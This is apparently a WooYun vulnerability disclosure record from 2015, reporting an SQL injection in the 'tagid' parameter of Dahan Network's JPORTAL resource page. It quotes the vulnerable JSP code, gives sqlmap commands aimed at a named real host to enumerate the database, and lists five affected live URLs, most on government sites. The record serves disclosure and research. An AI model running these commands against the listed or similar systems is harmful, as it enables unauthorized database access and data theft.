{"id": 37586, "wybug_id": "wooyun-2015-099361", "wybug_title": "JPORTAL资源整合SQL注射漏洞三", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-06 15:11", "wybug_open_date": "2015-06-09 09:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向公众公开  简要描述： JPORTAL资源整合SQL注射漏洞三 详细说明：  突然发现大汉网络的JPORTAL资源整合系统在一般应用里面，SO... 我来了文件路径： /pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1部分代码为：\nString tagid = Convert.getParameter(request,\"tagid\");\tString tagname = Convert.getParameter(request,\"tagname\");\tint isiteid= userEntity.getI_siteid();\tint linages = 5;\tint nowpage = Convert.getParameterInt(request, \"page\", 1);\tString userid = Convert.getParameter(request,\"userid\");\tString msg = \"\";\t\t//全局参数\tPertool_UserThemesBLF userthemesblf = new Pertool_UserThemesBLF();\tString themesid = userthemesblf.getUserThemes(\"\"+userEntity.getI_id(),channelid,userEntity.getI_siteid());\tStringBuffer strbuf_even = new StringBuffer();\t//取得频道\tPertool_ResourceService resblf = new Pertool_ResourceService();\tPertool_ChannelBLF channelBLF = new Pertool_ChannelBLF(request);\tPertool_ChannelEntity channelEntity = new Pertool_ChannelEntity();\tchannelEntity.setI_siteid(isiteid);\tchannelEntity.setVc_userid(\"\"+userEntity.getI_id());\tArrayList<Pertool_ChannelEntity> al_channel = channelBLF.getChannelEntity(channelEntity);\t\t//取得与标签相关的资源\tPertool_ResourceDetail resdetail = new Pertool_ResourceDetail();\tArrayList<Pertool_ResourceEntity> all_resentity = resdetail.getResByTagId(tagid,linages,nowpage,isiteid,userid,channelid);\tArrayList<Pertool_ResourceEntity> all_resEntityNum = resdetail.getResByTagId(tagid,0,0,isiteid,userid,channelid);\tPertool_ResourceEntity resentity = null;\tString alltagName  = \"\";\tArrayList<Pertool_TagEntity> allTagEntity = resdetail.getAllTags(tagid);\ntagid进入getAllTags造成注入sqlmap.py - \"www.simt.com.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1\" --dbms oracle\n\nsqlmap.py - \"www.simt.com.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1\" --dbms oracle --current-db\n\n5个案例：http://www.simt.com.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1http://inb.ningbo.gov.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1http://portal.jinan.gov.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1http://www.zj.gov.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1http://pertool.sdds.gov.cn/pertool_subsite/resource/res_detail_list_ajax.jsp?tagid=1    漏洞证明：     修复方案：  对参数进行全局过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-09 09:08 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}